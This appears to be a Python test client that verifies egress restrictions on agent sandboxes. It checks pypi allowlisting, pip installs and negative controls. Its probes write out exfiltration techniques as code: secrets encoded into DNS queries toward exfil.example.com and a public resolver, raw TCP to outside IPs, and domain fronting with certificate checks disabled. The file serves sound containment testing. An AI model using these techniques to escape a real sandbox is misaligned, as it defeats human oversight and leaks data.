"""Runs inside an agent-identity pod. Submits probes through the executors
of two sandboxes: one from the pypi egress pool, one from the default pool
(negative control). Prints one line per check: PASS, FAIL or GAP <id> (a
known weakness from docs/known-gaps.md, reported rather than failed on).

Usage: egress_client.py PYPI_SANDBOX_IP DEFAULT_SANDBOX_IP
"""
import json
import sys
import urllib.request

pypi_ip, default_ip = sys.argv[1:3]


def run(ip, code, timeout_s=45):
    req = urllib.request.Request(f"http://{ip}:8888/run", method="POST",
                                 data=json.dumps({"code": code, "timeout_s": timeout_s}).encode(),
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout_s + 15) as r:
        r = json.load(r)
    return (r["stdout"] + r["stderr"]).strip().splitlines()[-1] if (r["stdout"] + r["stderr"]).strip() else "(no output)"


RESOLVE = """
import socket
try: print("RESOLVED", socket.gethostbyname("{name}"))
except OSError as e: print("REFUSED", e)
"""
# Raw query straight to a resolver, bypassing the pod's resolv.conf.
DIRECT_DNS = """
import socket, struct
q = struct.pack(">HHHHHH", 1, 0x0100, 1, 0, 0, 0) + b"".join(bytes([len(l)]) + l.encode() for l in "{name}".split(".")) + b"\\0" + struct.pack(">HH", 1, 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(3)
try:
    s.sendto(q, ("{server}", 53)); s.recv(512); print("ANSWERED")
except OSError as e: print("NO ANSWER", type(e).__name__)
"""
TCP = """
import socket
try: socket.create_connection(("{host}", {port}), timeout=4); print("CONNECTED")
except OSError as e: print("BLOCKED", type(e).__name__)
"""
# TLS to pypi.org's address with a chosen SNI and Host header. Certificate
# checks are off on purpose: exfiltrating code wouldn't verify either.
TLS = """
import socket, ssl
ip = socket.gethostbyname("pypi.org")
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
try:
    t = ctx.wrap_socket(socket.create_connection((ip, 443), timeout=5), server_hostname="{sni}")
    t.sendall(b"HEAD / HTTP/1.1\\r\\nHost: {host}\\r\\nConnection: close\\r\\n\\r\\n")
    head = t.recv(4096).decode(errors="replace").split("\\r\\n")
    server = [l for l in head if l.lower().startswith("server:")]
    print("REACHED", head[0], server[0] if server else "")
except OSError as e: print("BLOCKED", type(e).__name__)
"""
PIP = """
import subprocess, sys
r = subprocess.run([sys.executable, "-m", "pip", "install", "--no-cache-dir", "--disable-pip-version-check",
                    "--target", "/tmp/lib", "six==1.16.0"], capture_output=True, text=True)
if r.returncode:
    print("PIP FAILED", r.stderr.strip().splitlines()[-1:]); raise SystemExit
sys.path.insert(0, "/tmp/lib"); import six
print("INSTALLED six", six.__version__)
"""


def check(name, ok, out, gap=None):
    # gap: a known-gap ID from docs/known-gaps.md, reported instead of failing.
    verdict = "PASS" if ok else (f"GAP {gap}" if gap else "FAIL")
    print(f"{verdict}  {name}: {out}", flush=True)


o = run(pypi_ip, RESOLVE.format(name="pypi.org"))
check("allowlisted name resolves (pypi.org)", o.startswith("RESOLVED"), o)
o = run(pypi_ip, TLS.format(sni="pypi.org", host="pypi.org"))
check("HTTPS to pypi.org", o.startswith("REACHED HTTP/1.1 200"), o)
o = run(pypi_ip, PIP, 55)
check("pip install from PyPI and import", o.startswith("INSTALLED"), o)
for name in ["example.com", "secret-hunter2.pypi.org", "github.com"]:
    o = run(pypi_ip, RESOLVE.format(name=name))
    check(f"name not on allowlist refused ({name})", o.startswith("REFUSED"), o)
o = run(pypi_ip, DIRECT_DNS.format(name="secret-hunter2.exfil.example.com", server="8.8.8.8"))
check("direct DNS to a public resolver blocked", o.startswith("NO ANSWER"), o)
o = run(pypi_ip, TCP.format(host="1.1.1.1", port=443))
check("TCP to a non-allowlisted IP blocked", o.startswith("BLOCKED"), o)
o = run(pypi_ip, TCP.format(host="pypi.org", port=80))
check("allowlisted name on another port blocked (pypi.org:80)", o.startswith("BLOCKED"), o)
o = run(pypi_ip, TLS.format(sni="www.fastly.com", host="www.fastly.com"))
check("other site on the same CDN IP, by SNI, blocked", o.startswith("BLOCKED"), o)
o = run(pypi_ip, TLS.format(sni="pypi.org", host="www.fastly.com"))
check("domain fronting (SNI pypi.org, Host www.fastly.com) blocked", o.startswith("BLOCKED"), o, gap="GAP-01")

o = run(default_ip, RESOLVE.format(name="pypi.org"))
check("negative control: default sandbox can't resolve pypi.org", o.startswith("REFUSED"), o)
o = run(default_ip, TCP.format(host="151.101.0.223", port=443))
check("negative control: default sandbox can't reach PyPI's IP", o.startswith("BLOCKED"), o)
